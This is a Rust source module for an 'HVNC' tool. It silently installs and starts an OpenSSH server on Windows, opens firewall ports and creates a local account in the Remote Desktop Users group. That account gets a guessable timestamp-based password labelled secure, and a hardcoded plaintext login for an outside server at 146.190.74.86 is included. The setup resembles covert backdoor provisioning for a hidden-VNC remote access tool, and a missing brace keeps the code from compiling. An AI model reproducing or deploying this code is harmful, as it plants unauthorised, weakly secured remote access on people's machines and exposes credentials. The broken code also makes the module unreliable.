//! Automated SSH server setup and configuration
//! 
//! This module handles automatic installation and configuration of OpenSSH server
//! on Windows hosts, eliminating the need for manual setup.

use crate::error::{HvncError, Result};
use log::{info, warn, debug};
use std::process::Command;
use std::path::Path;
use std::fs;
use std::io::Write;

/// SSH server configuration manager
pub struct SshSetup {
    ssh_installed: bool,
    ssh_configured: bool,
    ssh_running: bool,
    use_direct_connection: bool,
    windows_edition: WindowsEdition,
    skip_slow_install: bool,
}

#[derive(Debug, PartialEq)]
enum WindowsEdition {
    Home,
    Pro,
    Enterprise,
    Unknown,
}

impl SshSetup {
    /// Create a new SSH setup manager
    pub fn new() -> Self {
        let windows_edition = Self::detect_windows_edition();
        Self {
            ssh_installed: false,
            ssh_configured: false,
            ssh_running: false,
            use_direct_connection: false,
            windows_edition,
            skip_slow_install: true,  // Default to skipping slow installs
        }
    }

    /// Create a new SSH setup manager with direct connection mode
    pub fn new_direct() -> Self {
        Self {
            ssh_installed: false,
            ssh_configured: false,
            ssh_running: false,
            use_direct_connection: true,
            windows_edition: Self::detect_windows_edition(),
            skip_slow_install: true,
        }
    }

    /// Detect Windows edition to determine SSH capabilities
    fn detect_windows_edition() -> WindowsEdition {
        let output = Command::new("powershell")
            .args(&["-Command", "Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -ExpandProperty Caption"])
            .output()
            .map_err(|_| WindowsEdition::Unknown);

        match output {
            Ok(output) => {
                let caption = String::from_utf8_lossy(&output.stdout).to_lowercase();
                if caption.contains("home") {
                    WindowsEdition::Home
                } else if caption.contains("pro") {
                    WindowsEdition::Pro
                } else if caption.contains("enterprise") {
                    WindowsEdition::Enterprise
                } else {
                    WindowsEdition::Unknown
                }
            }
            Err(_) => WindowsEdition::Unknown,
        }
    }

    /// Automatically setup SSH server with smart detection and fallbacks
    pub fn auto_setup(&mut self) -> Result<SshConnectionInfo> {
        if self.use_direct_connection {
            return self.setup_direct_connection();
        }

        info!("Starting automatic SSH server setup...");
        info!("Detected Windows edition: {:?}", self.windows_edition);

        // Check current SSH status
        self.check_ssh_status()?;

        // Smart SSH installation strategy
        if !self.ssh_installed {
            if let Err(e) = self.smart_ssh_installation() {
                warn!("SSH installation failed: {}", e);
                return self.offer_alternatives();
            }
        }

        // Configure SSH if not configured
        if !self.ssh_configured {
            self.configure_ssh_server()?;
        }

        // Start SSH service if not running
        if !self.ssh_running {
            self.start_ssh_service()?;
        }

        // Setup firewall rules
        self.configure_firewall()?;

        // Create or get connection credentials
        let connection_info = self.setup_connection_credentials()?;

        info!("SSH server setup completed successfully");
        Ok(connection_info)
    }

    /// Setup SSH server in completely silent mode
    pub fn auto_setup_silent(&mut self) -> Result<SshConnectionInfo> {
        info!("Starting silent SSH server setup...");

        // Check current SSH status
        self.check_ssh_status()?;

        // Install SSH if not present (prioritize fast methods)
        if !self.ssh_installed {
            // Try fast methods first, fallback to direct connection if all fail
            if let Err(_) = self.smart_ssh_installation_silent() {
                warn!("SSH installation failed, using direct connection");
                self.use_direct_connection = true;
                return self.setup_direct_connection();
            }
        }

        // Configure SSH if not configured
        if !self.ssh_configured {
            self.configure_ssh_server()?;
        }

        // Start SSH service if not running
        if !self.ssh_running {
            self.start_ssh_service()?;
        }

        // Setup firewall rules
        self.configure_firewall()?;

        // Create or get connection credentials with default server info
        let connection_info = self.setup_default_server_credentials()?;

        info!("SSH server setup completed successfully");
        Ok(connection_info)
    }

    /// Smart SSH installation with silent fallbacks (no user prompts)
    fn smart_ssh_installation_silent(&mut self) -> Result<()> {
        debug!("Starting silent SSH installation...");

        // Strategy 1: Check for existing SSH installations
        if self.check_existing_ssh_servers()? {
            info!("Found existing SSH server installation");
            self.ssh_installed = true;
            return Ok(());
        }

        // Strategy 2: Try fast package managers first
        if self.try_fast_package_managers()? {
            self.ssh_installed = true;
            return Ok(());
        }

        // Strategy 3: Windows Home - automatically use direct connection
        if self.windows_edition == WindowsEdition::Home {
            info!("Windows Home detected - switching to direct connection mode");
            self.use_direct_connection = true;
            return Err(HvncError::OperationFailed("Windows Home uses direct connection".to_string()));
        }

        // Strategy 4: Try Microsoft installation silently (no prompts)
        if self.check_openssh_capability_available()? {
            info!("Attempting Microsoft OpenSSH installation (silent mode)");
            return self.install_microsoft_openssh();
        }

        // If all fails, use direct connection
        Err(HvncError::OperationFailed("No SSH installation method available".to_string()))
    }

    /// Smart SSH installation with multiple fallback options
    fn smart_ssh_installation(&mut self) -> Result<()> {
        info!("Starting smart SSH installation...");

        // Strategy 1: Check for existing SSH installations
        if self.check_existing_ssh_servers()? {
            info!("Found existing SSH server installation");
            self.ssh_installed = true;
            return Ok(());
        }

        // Strategy 2: Try fast package managers first
        if self.try_fast_package_managers()? {
            self.ssh_installed = true;
            return Ok(());
        }

        // Strategy 3: Windows Home specific alternatives
        if self.windows_edition == WindowsEdition::Home {
            return self.handle_windows_home_ssh();
        }

        // Strategy 4: Check if OpenSSH capability is available (Pro/Enterprise)
        if !self.check_openssh_capability_available()? {
            warn!("OpenSSH Server capability not available on this system");
            return Err(HvncError::OperationFailed(
                "OpenSSH Server capability not available".to_string()
            ));
        }

        // Strategy 5: Ask user about slow installation
        if !self.confirm_slow_installation()? {
            return Err(HvncError::OperationFailed(
                "User cancelled slow SSH installation".to_string()
            ));
        }

        // Strategy 6: Fallback to Microsoft installation (slow)
        self.install_microsoft_openssh()
    }

    /// Offer alternatives when SSH installation fails
    fn offer_alternatives(&mut self) -> Result<SshConnectionInfo> {
        println!("❌ SSH installation failed");
        println!();
        println!("Alternative options:");
        println!("1. Use direct connection (no SSH tunnel)");
        println!("2. Install SSH manually and restart");
        println!("3. Exit and use another computer");
        println!();
        println!("Choose option (1-3):");
        
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();
        
        match input.trim() {
            "1" => {
                info!("Switching to direct connection mode");
                self.use_direct_connection = true;
                self.setup_direct_connection()
            }
            "2" => {
                println!("Please install OpenSSH manually:");
                println!("1. Settings > Apps > Optional Features");
                println!("2. Add a feature > OpenSSH Server");
                println!("3. Restart this application");
                Err(HvncError::OperationFailed("Manual SSH installation required".to_string()))
            }
            _ => {
                Err(HvncError::OperationFailed("Setup cancelled".to_string()))
            }
        }
    }

    /// Handle SSH installation for Windows Home edition
    fn handle_windows_home_ssh(&mut self) -> Result<()> {
        warn!("Windows Home detected - OpenSSH Server capability may not be available");
        
        println!("⚠️  Windows Home Detected");
        println!("OpenSSH Server capability is not available in Windows Home edition.");
        println!();
        println!("Available options:");
        println!("1. Use direct connection (no SSH tunnel) - FASTEST");
        println!("2. Try portable SSH server installation");
        println!("3. Cancel and upgrade to Windows Pro");
        println!();
        println!("Choose option (1-3):");
        
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();
        
        match input.trim() {
            "1" => {
                info!("Switching to direct connection mode for Windows Home");
                self.use_direct_connection = true;
                return Err(HvncError::OperationFailed("Switching to direct connection".to_string()));
            }
            "2" => {
                return self.try_portable_ssh_server();
            }
            _ => {
                return Err(HvncError::OperationFailed("Installation cancelled".to_string()));
            }
        }
    }

    /// Try installing portable SSH server for Windows Home
    fn try_portable_ssh_server(&mut self) -> Result<()> {
        info!("Attempting to install portable SSH server...");
        
        // Try Git for Windows SSH (if available)
        if self.try_git_for_windows_ssh()? {
            self.ssh_installed = true;
            return Ok(());
        }

        // Try downloading portable OpenSSH
        if self.try_portable_openssh_download()? {
            self.ssh_installed = true;
            return Ok(());
        }

        Err(HvncError::OperationFailed(
            "Could not install portable SSH server".to_string()
        ))
    }

    /// Check for existing SSH servers (including third-party)
    fn check_existing_ssh_servers(&self) -> Result<bool> {
        debug!("Checking for existing SSH installations...");
        
        let ssh_paths = vec![
            // Windows built-in OpenSSH
            "C:\\Windows\\System32\\OpenSSH\\sshd.exe",
            // Git for Windows
            "C:\\Program Files\\Git\\usr\\bin\\sshd.exe",
            "C:\\Program Files (x86)\\Git\\usr\\bin\\sshd.exe",
            // Chocolatey installations
            "C:\\tools\\openssh\\sshd.exe",
            "C:\\ProgramData\\chocolatey\\bin\\sshd.exe",
            // Scoop installations
            "C:\\Users\\%USERNAME%\\scoop\\apps\\openssh\\current\\sshd.exe",
            // Manual installations
            "C:\\Program Files\\OpenSSH\\sshd.exe",
            "C:\\OpenSSH\\sshd.exe",
        ];

        for path in ssh_paths {
            let expanded_path = if path.contains("%USERNAME%") {
                path.replace("%USERNAME%", &std::env::var("USERNAME").unwrap_or_default())
            } else {
                path.to_string()
            };
            
            if Path::new(&expanded_path).exists() {
                info!("Found existing SSH server at: {}", expanded_path);
                return Ok(true);
            }
        }

        Ok(false)
    }

    /// Try fast package managers before slow Microsoft installation
    fn try_fast_package_managers(&self) -> Result<bool> {
        info!("Checking for fast package managers...");

        // Try Chocolatey (usually much faster)
        if self.try_chocolatey_openssh()? {
            info!("Successfully installed OpenSSH via Chocolatey");
            return Ok(true);
        }

        // Try Scoop (also faster)
        if self.try_scoop_openssh()? {
            info!("Successfully installed OpenSSH via Scoop");
            return Ok(true);
        }

        // Try winget (Windows Package Manager)
        if self.try_winget_openssh()? {
            info!("Successfully installed OpenSSH via winget");
            return Ok(true);
        }

        Ok(false)
    }

    /// Try installing OpenSSH via Chocolatey
    fn try_chocolatey_openssh(&self) -> Result<bool> {
        let choco_check = Command::new("choco")
            .args(&["--version"])
            .output();

        if choco_check.is_err() {
            debug!("Chocolatey not available");
            return Ok(false);
        }

        info!("Installing OpenSSH via Chocolatey (fast)...");
        let output = Command::new("choco")
            .args(&["install", "openssh", "-y", "--force"])
            .output();

        match output {
            Ok(result) if result.status.success() => {
                info!("OpenSSH installed successfully via Chocolatey");
                Ok(true)
            }
            _ => {
                debug!("Chocolatey OpenSSH installation failed");
                Ok(false)
            }
        }
    }

    /// Try installing OpenSSH via Scoop
    fn try_scoop_openssh(&self) -> Result<bool> {
        let scoop_check = Command::new("scoop")
            .args(&["--version"])
            .output();

        if scoop_check.is_err() {
            debug!("Scoop not available");
            return Ok(false);
        }

        info!("Installing OpenSSH via Scoop (fast)...");
        let output = Command::new("scoop")
            .args(&["install", "openssh"])
            .output();

        match output {
            Ok(result) if result.status.success() => {
                info!("OpenSSH installed successfully via Scoop");
                Ok(true)
            }
            _ => {
                debug!("Scoop OpenSSH installation failed");
                Ok(false)
            }
        }
    }

    /// Try installing OpenSSH via winget (Windows Package Manager)
    fn try_winget_openssh(&self) -> Result<bool> {
        let winget_check = Command::new("winget")
            .args(&["--version"])
            .output();

        if winget_check.is_err() {
            debug!("winget not available");
            return Ok(false);
        }

        info!("Installing OpenSSH via winget (fast)...");
        let output = Command::new("winget")
            .args(&["install", "Microsoft.OpenSSH.Beta"])
            .output();

        match output {
            Ok(result) if result.status.success() => {
                info!("OpenSSH installed successfully via winget");
                Ok(true)
            }
            _ => {
                debug!("winget OpenSSH installation failed");
                Ok(false)
            }
        }
    }

    /// Try using Git for Windows SSH server
    fn try_git_for_windows_ssh(&self) -> Result<bool> {
        let git_ssh_paths = vec![
            "C:\\Program Files\\Git\\usr\\bin\\sshd.exe",
            "C:\\Program Files (x86)\\Git\\usr\\bin\\sshd.exe",
        ];

        for path in git_ssh_paths {
            if Path::new(path).exists() {
                info!("Found Git for Windows SSH server at: {}", path);
                // Configure to use Git's SSH server
                return Ok(true);
            }
        }

        Ok(false)
    }

    /// Try downloading portable OpenSSH
    fn try_portable_openssh_download(&self) -> Result<bool> {
        warn!("Downloading portable OpenSSH - this may take a moment...");
        
        // This would download a portable OpenSSH package
        // For now, return false to indicate it's not implemented
        // In a full implementation, this would download from:
        // https://github.com/PowerShell/Win32-OpenSSH/releases
        
        Ok(false)
    }

    /// Check if OpenSSH Server capability is available
    fn check_openssh_capability_available(&self) -> Result<bool> {
        let output = Command::new("powershell")
            .args(&["-Command", "Get-WindowsCapability -Online -Name OpenSSH.Server*"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to check SSH capability: {}", e)))?;

        let output_str = String::from_utf8_lossy(&output.stdout);
        Ok(output_str.contains("OpenSSH.Server"))
    }

    /// Ask user about proceeding with slow Microsoft installation
    fn confirm_slow_installation(&mut self) -> Result<bool> {
        println!("⚠️  SSH Installation Notice");
        println!("OpenSSH installation from Microsoft servers can be slow (5-15 minutes).");
        println!();
        println!("Options:");
        println!("1. Continue with Microsoft OpenSSH installation (slow but secure)");
        println!("2. Use direct connection mode (fast but less secure)");
        println!("3. Cancel and install SSH manually");
        println!();
        println!("Choose option (1-3):");
        
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();
        
        match input.trim() {
            "1" => Ok(true),
            "2" => {
                self.use_direct_connection = true;
                Err(HvncError::OperationFailed("Switching to direct connection".to_string()))
            }
            _ => Ok(false),
        }
    }

    /// Install OpenSSH via Microsoft (original slow method)
    fn install_microsoft_openssh(&mut self) -> Result<()> {
        warn!("Installing OpenSSH from Microsoft servers - this will take several minutes...");
        println!("⏳ Installing OpenSSH Server...");
        println!("This may take 5-15 minutes depending on your internet connection.");
        println!("Please be patient...");

        let output = Command::new("powershell")
            .args(&["-Command", "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to install SSH server: {}", e)))?;

        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(HvncError::OperationFailed(format!("SSH installation failed: {}", error_msg)));
        }

        self.ssh_installed = true;
        info!("OpenSSH Server installed successfully");
        Ok(())
    }

    /// Setup direct connection without SSH tunnel
    fn setup_direct_connection(&self) -> Result<SshConnectionInfo> {
        info!("Setting up direct connection...");

        // Get local IP address
        let local_ip = self.get_local_ip_address()?;

        Ok(SshConnectionInfo {
            host: local_ip.clone(),
            port: 5900,
            username: "".to_string(),
            password: "".to_string(),
            tunnel_command: "".to_string(),
            is_direct: true,
        })
    }

    /// Check current SSH installation and configuration status
    fn check_ssh_status(&mut self) -> Result<()> {
        debug!("Checking SSH server status...");

        // Check if OpenSSH Server is installed
        let output = Command::new("powershell")
            .args(&["-Command", "Get-WindowsCapability -Online -Name OpenSSH.Server*"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to check SSH capability: {}", e)))?;

        let output_str = String::from_utf8_lossy(&output.stdout);
        self.ssh_installed = output_str.contains("State : Installed");

        // Check if SSH service exists and is running
        if self.ssh_installed {
            let service_output = Command::new("sc")
                .args(&["query", "sshd"])
                .output()
                .map_err(|e| HvncError::OperationFailed(format!("Failed to check SSH service: {}", e)))?;

            let service_str = String::from_utf8_lossy(&service_output.stdout);
            self.ssh_running = service_str.contains("RUNNING");

            // Check if SSH is configured
            self.ssh_configured = Path::new("C:\\ProgramData\\ssh\\sshd_config").exists();
        }

        debug!("SSH Status - Installed: {}, Configured: {}, Running: {}", 
               self.ssh_installed, self.ssh_configured, self.ssh_running);

        Ok(())
    }

    /// Install OpenSSH Server automatically
    fn install_openssh_server(&mut self) -> Result<()> {
        info!("Installing OpenSSH Server...");

        let output = Command::new("powershell")
            .args(&["-Command", "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to install SSH server: {}", e)))?;

        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            return Err(HvncError::OperationFailed(format!("SSH installation failed: {}", error_msg)));
        }

        self.ssh_installed = true;
        info!("OpenSSH Server installed successfully");
        Ok(())
    }

    /// Configure SSH server with secure defaults
    fn configure_ssh_server(&mut self) -> Result<()> {
        info!("Configuring SSH server...");

        // Create SSH configuration directory
        let ssh_dir = Path::new("C:\\ProgramData\\ssh");
        if !ssh_dir.exists() {
            fs::create_dir_all(ssh_dir)
                .map_err(|e| HvncError::OperationFailed(format!("Failed to create SSH directory: {}", e)))?;
        }

        // Create secure SSH configuration
        let config_content = r#"# HVNC Auto-Generated SSH Configuration
Port 22
Protocol 2
HostKey C:\ProgramData\ssh\ssh_host_rsa_key
HostKey C:\ProgramData\ssh\ssh_host_dsa_key
HostKey C:\ProgramData\ssh\ssh_host_ecdsa_key
HostKey C:\ProgramData\ssh\ssh_host_ed25519_key

# Authentication
PasswordAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys

# Security settings
PermitRootLogin no
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2

# Logging
SyslogFacility AUTH
LogLevel INFO

# Subsystem
Subsystem sftp sftp-server.exe

# HVNC specific settings
AllowUsers hvnc-user
Match User hvnc-user
    AllowTcpForwarding yes
    PermitTunnel yes
"#;

        let config_path = ssh_dir.join("sshd_config");
        fs::write(&config_path, config_content)
            .map_err(|e| HvncError::OperationFailed(format!("Failed to write SSH config: {}", e)))?;

        // Generate host keys if they don't exist
        self.generate_host_keys()?;

        self.ssh_configured = true;
        info!("SSH server configured successfully");
        Ok(())
    }

    /// Generate SSH host keys
    fn generate_host_keys(&self) -> Result<()> {
        debug!("Generating SSH host keys...");

        let key_types = vec![
            ("rsa", "ssh_host_rsa_key"),
            ("dsa", "ssh_host_dsa_key"),
            ("ecdsa", "ssh_host_ecdsa_key"),
            ("ed25519", "ssh_host_ed25519_key"),
        ];

        for (key_type, key_name) in key_types {
            let key_path = format!("C:\\ProgramData\\ssh\\{}", key_name);
            if !Path::new(&key_path).exists() {
                let output = Command::new("ssh-keygen")
                    .args(&["-t", key_type, "-f", &key_path, "-N", ""])
                    .output();

                if output.is_err() {
                    warn!("Failed to generate {} key, SSH might not be fully functional", key_type);
                }
            }
        }

        Ok(())
    }

    /// Start SSH service
    fn start_ssh_service(&mut self) -> Result<()> {
        info!("Starting SSH service...");

        // Set service to automatic startup
        let _ = Command::new("sc")
            .args(&["config", "sshd", "start=", "auto"])
            .output();

        // Start the service
        let output = Command::new("net")
            .args(&["start", "sshd"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to start SSH service: {}", e)))?;

        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            if !error_msg.contains("already been started") {
                return Err(HvncError::OperationFailed(format!("SSH service start failed: {}", error_msg)));
            }
        }

        self.ssh_running = true;
        info!("SSH service started successfully");
        Ok(())
    }

    /// Configure Windows Firewall for SSH
    fn configure_firewall(&self) -> Result<()> {
        info!("Configuring firewall for SSH...");

        let commands = vec![
            vec!["netsh", "advfirewall", "firewall", "add", "rule", 
                 "name=OpenSSH-Server-In-TCP", "dir=in", "action=allow", 
                 "protocol=TCP", "localport=22"],
            vec!["netsh", "advfirewall", "firewall", "add", "rule", 
                 "name=HVNC-Server-In-TCP", "dir=in", "action=allow", 
                 "protocol=TCP", "localport=5900", "remoteip=127.0.0.1"],
        ];

        for cmd in commands {
            let output = Command::new(cmd[0])
                .args(&cmd[1..])
                .output()
                .map_err(|e| HvncError::OperationFailed(format!("Failed to configure firewall: {}", e)))?;

            if !output.status.success() {
                let error_msg = String::from_utf8_lossy(&output.stderr);
                if !error_msg.contains("already exists") {
                    warn!("Firewall rule creation warning: {}", error_msg);
                }
            }
        }

        info!("Firewall configured successfully");
        Ok(())
    }

    /// Setup connection credentials automatically
    fn setup_connection_credentials(&self) -> Result<SshConnectionInfo> {
        info!("Setting up connection credentials...");

        // Create dedicated HVNC user
        let username = "hvnc-user";
        let password = self.generate_secure_password();

        // Check if user already exists
        let user_exists = Command::new("net")
            .args(&["user", username])
            .output()
            .map(|output| output.status.success())
            .unwrap_or(false);

        if !user_exists {
            // Create user
            let output = Command::new("net")
                .args(&["user", username, &password, "/add", "/comment:HVNC Service Account"])
                .output()
                .map_err(|e| HvncError::OperationFailed(format!("Failed to create user: {}", e)))?;

            if !output.status.success() {
                let error_msg = String::from_utf8_lossy(&output.stderr);
                return Err(HvncError::OperationFailed(format!("User creation failed: {}", error_msg)));
            }

            // Add user to Remote Desktop Users group
            let _ = Command::new("net")
                .args(&["localgroup", "Remote Desktop Users", username, "/add"])
                .output();

            info!("Created HVNC user account");
        } else {
            info!("HVNC user account already exists");
        }

        // Get local IP address
        let local_ip = self.get_local_ip_address()?;

        Ok(SshConnectionInfo {
            host: local_ip.clone(),
            port: 22,
            username: username.to_string(),
            password: password,
            tunnel_command: format!("ssh -L 3390:127.0.0.1:5900 {}@{}", username, local_ip),
            is_direct: false,
        })

    /// Setup connection credentials using default server configuration
    fn setup_default_server_credentials(&self) -> Result<SshConnectionInfo> {
        info!("Setting up connection credentials for default server...");

        // Use default server credentials (tunneluser@146.190.74.86)
        let username = "tunneluser";
        let password = "EuroFw19@a03ee";
        let host = "146.190.74.86";

        Ok(SshConnectionInfo {
            host: host.to_string(),
            port: 22,
            username: username.to_string(),
            password: password.to_string(),
            tunnel_command: format!("ssh -L 3390:127.0.0.1:5900 {}@{}", username, host),
            is_direct: false,
        })
    }

    /// Generate a secure random password
    fn generate_secure_password(&self) -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();
        
        // Generate a secure password based on timestamp and system info
        format!("HVNC{}!{}", timestamp % 10000, (timestamp / 10000) % 100)
    }

    /// Get the local IP address for SSH connections
    fn get_local_ip_address(&self) -> Result<String> {
        let output = Command::new("powershell")
            .args(&["-Command", 
                   "Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Ethernet*','Wi-Fi*' | Where-Object {$_.IPAddress -ne '127.0.0.1'} | Select-Object -First 1 -ExpandProperty IPAddress"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to get IP address: {}", e)))?;

        let ip = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if ip.is_empty() {
            Ok("127.0.0.1".to_string()) // Fallback to localhost
        } else {
            Ok(ip)
        }
    }
}

/// SSH connection information for clients
#[derive(Debug, Clone)]
pub struct SshConnectionInfo {
    pub host: String,
    pub port: u16,
    pub username: String,
    pub password: String,
    pub tunnel_command: String,
    pub is_direct: bool,
}

impl SshConnectionInfo {
    /// Display connection information for users
    pub fn display_connection_info(&self) {
        println!("\n=== HVNC Connection Information ===");
        println!("Host: {}", self.host);
        println!("SSH Port: {}", self.port);
        println!("Username: {}", self.username);
        println!("Password: {}", self.password);
        println!("\nTo connect from client:");
        println!("1. Establish SSH tunnel:");
        println!("   {}", self.tunnel_command);
        println!("2. Connect HVNC client:");
        println!("   hvnc-client --server 127.0.0.1:3390");
        println!("=====================================\n");
    }

    /// Save connection info to file for easy access
    pub fn save_to_file(&self, path: &str) -> Result<()> {
        let content = format!(
            "HVNC Connection Information\n\
             Host: {}\n\
             SSH Port: {}\n\
             Username: {}\n\
             Password: {}\n\
             \n\
             SSH Tunnel Command:\n\
             {}\n\
             \n\
             Client Connection:\n\
             hvnc-client --server 127.0.0.1:3390\n",
            self.host, self.port, self.username, self.password, self.tunnel_command
        );

        fs::write(path, content)
            .map_err(|e| HvncError::OperationFailed(format!("Failed to save connection info: {}", e)))?;

        info!("Connection information saved to: {}", path);
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ssh_setup_creation() {
        let setup = SshSetup::new();
        assert!(!setup.ssh_installed);
        assert!(!setup.ssh_configured);
        assert!(!setup.ssh_running);
    }

    #[test]
    fn test_password_generation() {
        let setup = SshSetup::new();
        let password1 = setup.generate_secure_password();
        let password2 = setup.generate_secure_password();
        
        assert!(!password1.is_empty());
        assert!(!password2.is_empty());
        assert!(password1.len() >= 8);
    }

    #[test]
    fn test_connection_info_display() {
        let info = SshConnectionInfo {
            host: "192.168.1.100".to_string(),
            port: 22,
            username: "hvnc-user".to_string(),
            password: "test123".to_string(),
            tunnel_command: "ssh -L 3390:127.0.0.1:5900 hvnc-user@192.168.1.100".to_string(),
            is_direct: false,
        };

        // This should not panic
        info.display_connection_info();
    }
}